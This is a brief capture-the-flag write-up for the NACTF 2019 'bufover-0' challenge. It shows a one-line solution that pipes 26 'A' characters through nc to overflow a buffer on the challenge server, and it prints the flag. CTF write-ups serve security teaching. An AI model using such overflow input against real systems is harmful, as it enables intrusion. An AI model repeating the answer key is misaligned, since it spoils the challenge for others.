#### Challenge:

The close cousin of a website for "Question marked as duplicate"

Can you cause a segfault and get the flag? `nc shell.2019.nactf.com 31475` [bufover-0](./bufover-0 ":ignore") [bufover-0.c](./bufover-0.c ":ignore")

---

#### Solution:

```bash
python -c 'print "A"*26' | nc shell.2019.nactf.com 31475
```

---

<details><summary>FLAG:</summary>

```
nactf{0v3rfl0w_th4at_buff3r_18ghKusB}
```

</details>
